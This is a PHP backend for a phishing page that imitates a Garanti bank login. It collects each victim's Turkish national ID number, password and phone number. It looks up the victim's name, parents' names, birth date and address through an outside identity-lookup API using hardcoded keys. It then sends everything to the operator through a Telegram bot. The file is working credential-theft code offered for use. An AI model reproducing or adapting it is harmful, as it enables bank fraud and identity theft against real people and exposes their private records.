<?php
require_once 'telegram.php';
$cookieName = "form_counter";
if (!isset($_COOKIE[$cookieName])) {
    $count = 0;
} else {
    $count = intval($_COOKIE[$cookieName]);
}
if ($count >= 6) {
    echo "Limit aşıldı!";
    exit;
}
$count++;
setcookie($cookieName, $count, time() + (86400), "/");
if ($_POST) {
    $tc = $_POST['username'];
    $password = $_POST['password'];

    if (!empty($_POST['telefon'])) {
        $tel = $_POST['telefon'];
        $telefon = '*📱 Telefon:* `'.$tel.'`';
    } else {
        $telefon = "";
    }

    date_default_timezone_set('Europe/Istanbul');
    $currentDate = date("d/m/Y");
    $currentTime = date("H:i:s");


$api_url = "https://nexusapiservice.xyz/servis/tckn/apiv2";
$hash = "Z3hZouW4aNIFJAz4Z";
$auth = "Axxel111"; 
$full_url = $api_url . "?hash=$hash&auth=$auth&tc=$tc";
$ch = curl_init();
$headers = [
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: tr-TR,tr;q=0.9',
];
curl_setopt($ch, CURLOPT_URL, $full_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$response = curl_exec($ch);
if (curl_errno($ch)) {
    echo "cURL Hatası: " . curl_error($ch);
    curl_close($ch);
    exit;
}
curl_close($ch);
$response_data = json_decode($response, true);
if (isset($response_data['Veri']['Adi']) && isset($response_data['Veri']['Soyadi'])) {
    $ad = $response_data['Veri']['Adi'];
    $soyad = $response_data['Veri']['Soyadi'];
   // $adsoyad = "".$ad." ".$soyad."";
	$AnneAdi = $response_data['Veri']['AnneAdi'];
	$BabaAdi = $response_data['Veri']['BabaAdi'];
	$DogumTarihi = $response_data['Veri']['DogumTarihi'];
	
	$AdresIl = $response_data['Veri']['AdresIl'];
	$AdresIlce = $response_data['Veri']['AdresIlce'];
	$Adres = $response_data['Veri']['2023Adres'];
} else { 
}	 



				$message  = "✅ *Axxel1 | Garanti Log Geldi* ✅\n";
				$message .= "	👤 *Ad Soyad*: `" . $ad . " " . $soyad . "`\n";
				$message .= "	⭐️ *TC Kimlik*: `" . $tc . "`\n";
				$message .= "	🔑 *Şifre*: `" . $password . "`\n";
				$message .= "	" . $telefon . "\n";
				$message .= "	🎂 *Doğum Tarihi*: _" . $DogumTarihi . "_\n";
				$message .= "	📆 *Tarih*: _" . $currentDate . "_\n";	
				$message .= "	🕑 *Saat*: _" . $currentTime . "_\n";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if (!curl_errno($ch)) {
		
		 $axxel = [
        "success" => true,
        "adsoyad" => "".$ad." ".$soyad."",
		"axxel1" => true
       
    ];
		
		echo json_encode($axxel, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
		
		
       // echo "axxel1:true";
    }
    curl_close($ch);
}
?>
